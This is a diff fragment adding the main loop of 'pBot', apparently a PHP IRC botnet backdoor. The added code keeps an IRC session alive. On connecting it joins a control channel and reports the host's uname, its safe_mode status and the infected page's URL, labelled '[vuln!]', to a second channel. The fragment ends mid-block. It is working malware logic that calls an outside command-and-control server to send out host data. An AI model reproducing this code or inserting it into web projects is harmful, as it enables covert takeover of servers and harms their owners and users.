@@ -67,7 +67,28 @@ class pBot
     $this->set_nick();
     $this->main();
  } 
- 
+  function main() 
+ { 
+    while(!feof($this->conn)) 
+    { 
+       $this->buf = trim(fgets($this->conn,512)); 
+       $cmd = explode(" ",$this->buf); 
+       if(substr($this->buf,0,6)=="PING :") 
+       { 
+          $this->send("PONG :".substr($this->buf,6)); 
+       } 
+       if(isset($cmd[1]) && $cmd[1] =="001") 
+       { 
+          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
+          $this->join($this->config['chan'],$this->config['key']);
+          if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
+          else { $safemode = "off"; }
+          $uname = php_uname();
+          $this->privmsg($this->config['chan2'],"[\2uname!\2]: $uname (safe: $safemode)");
+          $this->privmsg($this->config['chan2'],"[\2vuln!\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
+       } 
+       if(isset($cmd[1]) && $cmd[1]=="433") 
+       { 
 #################################################################
 ##### [ Stop Editing if you dont know what are you doing. ] #####
 #################################################################
